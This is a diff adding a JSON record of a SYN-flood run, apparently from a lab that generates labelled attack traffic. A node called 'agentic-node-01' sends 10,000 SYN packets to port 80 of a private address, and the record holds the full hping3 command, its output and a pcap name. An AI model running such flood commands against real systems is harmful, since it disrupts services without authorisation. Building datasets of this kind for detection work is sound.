@@ -1,0 +1,39 @@
+{
+  "id": "attack-synflood-1000pps",
+  "class": "attack",
+  "tool": "hping3",
+  "sender": "agentic-node-01",
+  "senderIp": "10.0.2.50",
+  "target": "10.0.2.119",
+  "params": {
+    "seconds": 10,
+    "pps": 1000,
+    "count": 10000,
+    "flags_or_proto": "syn",
+    "port": 80
+  },
+  "command": [
+    "sudo",
+    "-n",
+    "timeout",
+    "15",
+    "hping3",
+    "-c",
+    "10000",
+    "-i",
+    "u1000",
+    "-I",
+    "eth0",
+    "-d",
+    "0",
+    "-q",
+    "-S",
+    "-p",
+    "80",
+    "10.0.2.119"
+  ],
+  "commandExit": 0,
+  "commandSeconds": 12.5,
+  "pcap": "attack-synflood-1000pps.pcap",
+  "commandStderrTail": "\n--- 10.0.2.119 hping statistic ---\n10000 packets transmitted, 9837 packets received, 2% packet loss\nround-trip min/avg/max = 4.5/16.7/1173.2 ms\n"
+}
